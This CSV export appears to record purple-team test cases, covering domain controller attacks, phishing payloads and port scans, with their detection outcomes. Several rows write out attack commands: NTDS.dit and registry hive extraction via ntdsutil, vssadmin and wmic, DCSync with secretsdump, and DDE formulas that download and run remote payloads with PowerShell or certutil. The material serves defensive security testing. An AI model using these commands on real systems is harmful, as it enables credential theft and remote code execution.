Enterprise Purple – 2018 Q3,Domain Controller Assault,Command & Control,Beacon SMB payload on a DC,T1571,,C2 channel,Completed,Detected,Low,TBD,No,,1) C2 beacon from DC is detected and blocked by EDR or network behavioral analysis tool,,,"EDR,Behavior Analytics",Batrider,2018-08-18T09:24:46.717Z,1534584286717,2018-08-18T10:23:56.717Z,1534587836717,2019-01-28T19:38:20.862Z,1548704300862,Security Risk Advisors,,"Establish an command-and-control beacon from a compromised DC, to other staging hosts on the internal network and potentially direct outbound connection to an external system.",Generate SMB beacon and run on DC,,Low,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Domain Controller Assault,Lateral Movement,Extract Password Hashes via NTDSUtil,T1003,,Compromise a DC,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR",,2018-08-18T13:42:41.717Z,1534599761717,2018-08-18T13:54:48.717Z,1534600488717,2018-08-18T14:48:19.717Z,1534603699717,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller via NTDSUtils.,ntdsutil “ac in ntds” “ifm” “cr fu \\yourip\tmp” q q,,Medium,High,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2018 Q3,Domain Controller Assault,Lateral Movement,Extract password hashes from DC using DC replication / DCSync,T1003,,Compromise a DC,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR",,2018-08-18T14:53:20.717Z,1534604000717,2018-08-18T16:07:28.717Z,1534608448717,2018-08-18T17:06:17.717Z,1534611977717,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller.,"Using impacket:
python secretsdump.py -just-dc DOMAIN/USER:PASSWORD@<DC IP>",,Medium,High,Internal,High,,,,
Enterprise Purple – 2018 Q3,Domain Controller Assault,Lateral Movement,Extract Password Hashes via VSS,T1003,,Compromise a DC,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR",,2018-08-18T18:52:53.717Z,1534618373717,2018-08-18T19:17:14.717Z,1534619834717,2018-08-18T19:22:24.717Z,1534620144717,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller via VSS (Volume Shadow Services).,"wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c vssadmin list shadows 2>&1 > C:\Temp\output.txt""
wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c vssadmin create shadow /for=C: 2>&1 > C:\Temp\output.txt""
wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\Temp\SYSTEM.hive 2>&1 > C:\Temp\output.txt""
wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\NTDS\ ntds.dit C:\Temp\NTDS.dit 2>&1 > C:\Temp\output.txt""",,Medium,High,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2018 Q3,Domain Controller Assault,Lateral Movement,Extract password hashes from DC by copying NTDS.dit,T1003,,Compromise a DC,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR,Endpoint Protection",,2018-08-18T07:07:49.717Z,1534576069717,2018-08-18T07:29:01.717Z,1534577341717,2018-08-18T08:39:54.717Z,1534581594717,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller.,"wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\NTDS\ ntds.dit C:\Temp\NTDS.dit 2>&1 > C:\Temp\output.txt""",,Medium,High,Internal,Medium,,,,SMBexec
Enterprise Purple – 2018 Q3,Domain Controller Assault,Lateral Movement,Interactive Logon to a DC,T1078,,Compromise a DC,Completed,NotDetected,TBD,TBD,Yes,,"1) SIEM rules are configured to detect unusual logons to DCs from domain admin users and service accounts, potential detection of anomalous system access from UEBA tool",,,"SIEM,Behavior Analytics",,2018-08-18T03:52:41.717Z,1534564361717,2018-08-18T05:41:32.717Z,1534570892717,2018-08-18T06:00:22.717Z,1534572022717,Security Risk Advisors,,Perform anomalous interactive logons to a DC from privileged user and service accounts.  Once logged in establish persistent remote shell.,Use RDP to access DC and set up persistence,,Medium,High,Internal,Low,,,,
Enterprise Purple – 2018 Q3,Domain Controller Assault,Command & Control,Beacon HTTP payload on a DC,T1571,,C2 channel,Completed,Blocked,TBD,No,No,,1) C2 beacon from DC is detected and blocked by EDR or network behavioral analysis tool,,,"EDR,Behavior Analytics",MUSHA,2018-08-18T11:29:13.717Z,1534591753717,2018-08-18T11:44:11.717Z,1534592651717,2019-01-28T19:37:12.510Z,1548704232510,Security Risk Advisors,,"Establish an command-and-control beacon from a compromised DC, to other staging hosts on the internal network and potentially direct outbound connection to an external system.",Start http listener and generate a payload from Attacks -> Packages,,Low,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Email With Malicious Attachments,Delivery,5 - Macro - WScript PowerShell,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2018-08-06T16:40:46.717Z,1533573646717,2018-08-06T17:39:57.717Z,1533577197717,2018-08-06T18:40:18.717Z,1533580818717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q3,Email With Malicious Attachments,Delivery,12 - Macro - MMG WMI Exe,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2018-08-07T14:05:50.717Z,1533650750717,2018-08-07T14:22:52.717Z,1533651772717,2018-08-07T15:52:43.717Z,1533657163717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Email With Malicious Attachments,Delivery,21 - Link Inside PDF,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-08-06T01:53:37.717Z,1533520417717,2018-08-06T02:22:50.717Z,1533522170717,2018-08-06T04:08:13.717Z,1533528493717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Create a PDF with a malicious link in it and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q3,Email With Malicious Attachments,Delivery,8 - Macro - MMG WMI PowerShell,T1566.001,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2018-08-07T06:59:02.717Z,1533625142717,2018-08-07T08:47:07.717Z,1533631627717,2018-08-07T08:56:47.717Z,1533632207717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Email With Malicious Attachments,Delivery,14 - Macro - Remote Template,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-08-05T12:16:37.717Z,1533471397717,2018-08-05T12:51:43.717Z,1533473503717,2018-08-05T13:42:32.717Z,1533476552717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Create a Word document, add the macro, then save as a .dotm 

Host the template

Create a new document and link the hosted template to it 
(Developer -> Document Template -> Document Template Url)",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q3,Email With Malicious Attachments,Delivery,6 - Macro - WScript EXE,T1566.001,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2018-08-06T23:18:33.717Z,1533597513717,2018-08-07T00:45:03.717Z,1533602703717,2018-08-07T01:06:26.717Z,1533603986717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q3,Email With Malicious Attachments,Delivery,17 - Macro - LuckyStrike PowerShell CellEmbed + Sandbox Evasion,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2018-08-07T21:03:41.717Z,1533675821717,2018-08-07T22:38:46.717Z,1533681526717,2019-01-28T18:48:50.986Z,1548701330986,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Email With Malicious Attachments,Delivery,13 - DDE - Exe,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2018-08-07T17:10:05.717Z,1533661805717,2018-08-07T18:04:58.717Z,1533665098717,2019-01-28T18:48:23.100Z,1548701303100,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,=cmd|'/c certutil https://<exe url> <local file location> && <local file location> && del <local file location>'!A1,,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q3,Email With Malicious Attachments,Delivery,7 - Macro - WScript PowerShell XOR,T1566.001,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2018-08-07T02:56:30.717Z,1533610590717,2018-08-07T03:49:09.717Z,1533613749717,2018-08-07T05:21:37.717Z,1533619297717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Email With Malicious Attachments,Delivery,15 - Archive - Macro,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2018-08-07T19:07:31.717Z,1533668851717,2018-08-07T19:42:27.717Z,1533670947717,2018-08-07T21:01:14.717Z,1533675674717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip or rar malicious document and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q3,Email With Malicious Attachments,Delivery,1 - Macro - Cobalt Strike Standard,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2018-08-05T04:02:09.717Z,1533441729717,2018-08-05T05:12:28.717Z,1533445948717,2018-08-05T05:31:55.717Z,1533447115717,Security Risk Advisors,,Send phishing email to victim containing link with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Attacks --> Packages --> MS Office Macro
Copy code to office document",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Email With Malicious Attachments,Delivery,11 - DDE - PowerShell,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2018-08-05T09:26:09.717Z,1533461169717,2018-08-05T11:16:21.717Z,1533467781717,2019-01-28T18:47:23.764Z,1548701243764,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"=cmd|'/c powershell -Exec ByPass -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString(\""http://<location of payload>\""))'!A1",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q3,Email With Malicious Attachments,Delivery,10 - Macro - MSBuild,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2018-08-06T20:24:20.717Z,1533587060717,2018-08-06T21:37:50.717Z,1533591470717,2019-01-28T18:47:04.670Z,1548701224670,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe <MALICIOUS_FILE>,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Email With Malicious Attachments,Delivery,18 - Encrypted Archive - Macro,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-08-05T16:26:50.717Z,1533486410717,2018-08-05T18:08:32.717Z,1533492512717,2018-08-05T19:54:44.717Z,1533498884717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip or rar and encrypt malicious document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q3,Email With Malicious Attachments,Delivery,9 - Macro - LuckyStrike PowerShell CellEmbed,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2018-08-07T10:51:34.717Z,1533639094717,2018-08-07T12:41:17.717Z,1533645677717,2019-01-28T18:46:51.585Z,1548701211585,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Email With Malicious Attachments,Delivery,22 - Link Inside Office Document,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-08-06T05:48:43.717Z,1533534523717,2018-08-06T06:40:38.717Z,1533537638717,2018-08-06T08:02:35.717Z,1533542555717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Send a office document with a malicious link in it,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q3,Email With Malicious Attachments,Delivery,3 - Macro - Cobalt Strike Standard as HREF (URL Rewrite Update),T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2018-08-06T08:53:01.717Z,1533545581717,2018-08-06T10:26:55.717Z,1533551215717,2018-08-06T11:01:22.717Z,1533553282717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Email With Malicious Attachments,Delivery,19 - Encrypted Archive - DDE,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-08-05T20:43:00.717Z,1533501780717,2018-08-05T21:02:30.717Z,1533502950717,2018-08-05T21:29:57.717Z,1533504597717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip and encrypt the dde office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q3,Email With Malicious Attachments,Delivery,2 - Macro - CobaltStrike Standard (MMG),T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2018-08-05T05:36:52.717Z,1533447412717,2018-08-05T07:12:31.717Z,1533453151717,2018-08-05T08:50:12.717Z,1533459012717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Email With Malicious Attachments,Delivery,16 - Archive - DDE,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2018-08-05T13:59:41.717Z,1533477581717,2018-08-05T14:46:39.717Z,1533480399717,2019-01-28T18:48:37.261Z,1548701317261,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip the dde office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q3,Email With Malicious Attachments,Delivery,4 - Macro - Cobalt Strike Standard (URL Rewrite Update),T1566.001,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2018-08-06T11:13:16.717Z,1533553996717,2018-08-06T12:49:22.717Z,1533559762717,2018-08-06T15:14:44.717Z,1533568484717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Email With Malicious Attachments,Delivery,20 - Password-protected Office Doc - Standard CS payload,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-08-05T21:49:28.717Z,1533505768717,2018-08-05T22:45:52.717Z,1533509152717,2018-08-06T00:35:07.717Z,1533515707717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Generate standard office payload using cobalt strike from Attacks -> Packages -> MS Office Macro

When saving the malicious macro, encrypt the document with a password by: Save -> Info -> Protect Document -> Encrypt With Password",,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q3,External Port Scans,Reconnaissance,"External - Noisy Port Scan with 1000 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,Detected,Info,TBD,TBD,,"1) Port scanning is detected by external IDS/IPS or firewall, with alert triggered in SIEM or other alerting mechanism",,,"Firewall,SIEM",MUSHA,2018-08-03T13:28:07.717Z,1533302887717,2018-08-03T14:23:54.717Z,1533306234717,2019-01-28T18:10:23.207Z,1548699023207,Security Risk Advisors,,Identify open ports and services,nmap --open -v2 -sS -Pn -oA nmap_noisy -iL ranges.txt,,High,Low,External,Low,,,,Nmap
Enterprise Purple – 2018 Q3,External Port Scans,Reconnaissance,"External - Stealthy Port Scan with 3 ports, service enumeration, limited NSE's",T1046,,Port scanning,Completed,Detected,Info,TBD,TBD,,"1) Port scanning is detected by external IDS/IPS or firewall, with alert triggered in SIEM or other alerting mechanism",,,"Firewall,SIEM",MUSHA,2018-08-03T09:39:21.717Z,1533289161717,2018-08-03T11:38:07.717Z,1533296287717,2019-01-28T18:10:36.364Z,1548699036364,Security Risk Advisors,,Identify open ports and services,"nmap --open -v 2 -sS -Pn -p 80,443,8080 --data-length 471 --randomize-hosts --script=http-title.nse --script-args=http.useragent=""Mozilla/5.0;Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; like Gecko"" -oA scans/nmap_stealthy -iL targets.txt",,High,Low,External,Low,,,,Nmap
Enterprise Purple – 2018 Q3,External Port Scans,Reconnaissance,"External - Moderate Port Scan with 10 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,Detected,Info,TBD,TBD,,"1) Port scanning is detected by external IDS/IPS or firewall, with alert triggered in SIEM or other alerting mechanism",,,"Firewall,SIEM",MUSHA,2018-08-03T05:37:30.717Z,1533274650717,2018-08-03T07:35:40.717Z,1533281740717,2019-01-28T18:10:52.499Z,1548699052499,Security Risk Advisors,,Identify open ports and services,"nmap --open -v 2 -sS -Pn -p 21,80,443,8080,8443 --script=ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,http-admin-check.nse,http-title.nse --script-args=http.useragent=""Mozilla/5.0; Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; like Gecko"" -oA scans/nmap_moderate -iL targets.txt",,High,Low,External,Low,,,,Nmap
Enterprise Purple – 2018 Q3,Email with Malicious Links,Delivery,3 - Link - Macro - Cobalt Strike Standard as HREF (URL Rewrite Update),T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-08-08T05:10:42.717Z,1533705042717,2018-08-08T05:44:18.717Z,1533707058717,2018-08-08T07:15:57.717Z,1533712557717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Email with Malicious Links,Delivery,1 - Link - Macro - Cobalt Strike Standard,T1566.002,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2018-08-08T00:32:25.717Z,1533688345717,2018-08-08T01:15:18.717Z,1533690918717,2018-08-08T03:07:59.717Z,1533697679717,Security Risk Advisors,,Send phishing email to victim containing link with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Attacks --> Packages --> MS Office Macro
Copy code to office document",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Email with Malicious Links,Delivery,7 - Link - Macro - WScript PowerShell XOR,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-08-08T15:37:28.717Z,1533742648717,2018-08-08T17:23:18.717Z,1533748998717,2018-08-08T17:31:33.717Z,1533749493717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Email with Malicious Links,Delivery,12 - Link - Macro - MMG WMI Exe,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-08-09T06:41:04.717Z,1533796864717,2018-08-09T07:55:09.717Z,1533801309717,2018-08-09T09:35:25.717Z,1533807325717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Email with Malicious Links,Delivery,11 - Link - DDE - PowerShell,T1566.002,,Phishing Payload,Completed,Blocked,TBD,No,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2018-08-09T02:32:41.717Z,1533781961717,2018-08-09T03:05:49.717Z,1533783949717,2019-01-28T18:52:00.073Z,1548701520073,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"=cmd|'/c powershell -Exec ByPass -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString(\""http://<location of payload>\""))'!A1",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q3,Email with Malicious Links,Delivery,9 - Link - Macro - LuckyStrike PowerShell CellEmbed,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-08-08T20:55:57.717Z,1533761757717,2018-08-08T22:34:51.717Z,1533767691717,2018-08-08T22:53:00.717Z,1533768780717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Email with Malicious Links,Delivery,8 - Link - Macro - MMG WMI PowerShell,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-08-08T18:49:52.717Z,1533754192717,2018-08-08T19:18:20.717Z,1533755900717,2018-08-08T20:36:11.717Z,1533760571717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Email with Malicious Links,Delivery,10 - Link - Macro - MSBuild,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-08-08T23:08:34.717Z,1533769714717,2018-08-08T23:46:58.717Z,1533772018717,2018-08-09T01:27:57.717Z,1533778077717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe <MALICIOUS_FILE>,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Email with Malicious Links,Delivery,17 - Link - Macro - LuckyStrike PowerShell CellEmbed + Sandbox Evasion,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-08-09T21:14:57.717Z,1533849297717,2018-08-09T21:56:41.717Z,1533851801717,2018-08-09T22:42:15.717Z,1533854535717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q3,Email with Malicious Links,Delivery,13 - Link - DDE - Exe,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-08-09T10:40:16.717Z,1533811216717,2018-08-09T11:09:15.717Z,1533812955717,2018-08-09T12:39:44.717Z,1533818384717,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,=cmd|'/c certutil https://<exe url> <local file location> && <local file location> && del <local file location>'!A1,,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
